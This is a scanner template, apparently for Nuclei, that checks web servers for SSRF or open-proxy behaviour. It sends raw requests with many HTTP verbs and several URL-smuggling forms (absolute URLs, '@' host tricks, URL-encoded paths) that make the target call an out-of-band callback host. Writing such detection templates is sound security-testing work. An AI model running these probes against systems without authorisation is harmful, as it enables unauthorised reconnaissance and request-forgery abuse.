id: ssrf-by-proxy

info:
  name: SSRF via Proxy
  author: geeknik
  severity: info

variables:
  ssrf_id: "{{randstr}}"

requests:
  - payloads:
      verb:
        - GET
        - HEAD
        - POST
        - PUT
        - DELETE
        - CONNECT
        - OPTIONS
        - TRACE
        - PATCH

    raw:
      - |
        {{verb}} http://{{interactsh-url}}/proxy-{{ssrf_id}}/{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |
        {{verb}} {{BaseURL}}/proxy-{{ssrf_id}}/{{verb}} HTTP/1.1
        Host: {{interactsh-url}}

      - |
        {{verb}} /http://{{interactsh-url}}/proxy-{{ssrf_id}}/{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |
        {{verb}} /{{BaseURL}}@{{interactsh-url}}/proxy-{{ssrf_id}}/{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |
        {{verb}} http%3A%2F%2F{{interactsh-url}}%2Fproxy-{{ssrf_id}}%2F{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |
        {{verb}} /http%3A%2F%2F{{interactsh-url}}%2Fproxy-{{ssrf_id}}%2F{{verb}} HTTP/1.1
        Host: {{Hostname}}

      - |
        {{verb}} /{{url_encode('{{BaseURL}}@{{interactsh-url}}/proxy-{{ssrf_id}}/{{verb}}')}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
      - type: word
        part: interactsh_request
        words:
          - "proxy-{{ssrf_id}}"
